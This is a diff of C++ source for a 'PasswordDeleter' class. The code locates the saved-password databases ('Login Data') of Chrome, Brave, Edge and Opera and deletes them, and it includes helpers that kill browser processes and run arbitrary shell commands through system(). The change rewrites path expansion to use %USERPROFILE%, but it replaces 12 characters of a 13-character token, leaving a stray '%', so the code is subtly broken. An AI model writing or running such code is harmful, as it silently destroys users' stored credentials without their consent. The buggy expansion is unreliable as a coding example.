@@ -1,5 +1,3 @@
-#ifndef DELETE_PASSWORDS_HPP
-#define DELETE_PASSWORDS_HPP
 
 #include <iostream>
 #include <string>
@@ -53,10 +51,10 @@ void PasswordDeleter::destroyPass() {
 
     // List of browser profiles and database names
     std::vector<std::pair<std::string, std::string>> browsers = {
-        {"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data", "Login Data"},
-        {"C:\\Users\\%USERNAME%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data", "Login Data"},
-        {"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data", "Login Data"},
-        {"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Opera Software\\Opera Stable", "Login Data"}
+        {"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default", "Login Data"},
+        {"%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default", "Login Data"},
+        {"%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", "Login Data"},
+        {"%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Stable", "Login Data"}
     };
 
     // Loop through all browsers and delete password database
@@ -64,20 +62,18 @@ void PasswordDeleter::destroyPass() {
         std::string browserPath = browser.first;
         std::string dbName = browser.second;
 
-        // Replace %USERNAME% with the actual username
-        size_t pos = browserPath.find("%USERNAME%");
-        if (pos != std::string::npos) {
-            char userProfile[256];
-            if (GetEnvironmentVariableA("USERNAME", userProfile, sizeof(userProfile))) {
-                browserPath.replace(pos, 10, userProfile);
+        // Expand %USERPROFILE% to the actual user profile path
+        char userProfile[MAX_PATH];
+        if (GetEnvironmentVariableA("USERPROFILE", userProfile, sizeof(userProfile))) {
+            size_t pos = browserPath.find("%USERPROFILE%");
+            if (pos != std::string::npos) {
+                browserPath.replace(pos, 12, userProfile);
             }
         }
 
         // Delete the password database (Login Data)
         deletePasswordDatabase(browserPath, dbName);
     }
-
-
 }
 
 void PasswordDeleter::killBrowserProcesses(const std::vector<std::string>& browserProcesses) {
@@ -92,7 +88,6 @@ void PasswordDeleter::deletePasswordDatabase(const std::string& browserProfilePa
     try {
         if (fs::exists(dbFilePath)) {
             fs::remove(dbFilePath);
-
         }
     }
     catch (const std::exception& e) {
@@ -104,4 +99,3 @@ void PasswordDeleter::runCommand(const std::string& command) {
     system(command.c_str());  // Run the system command
 }
 
-#endif // DELETE_PASSWORDS_HPP
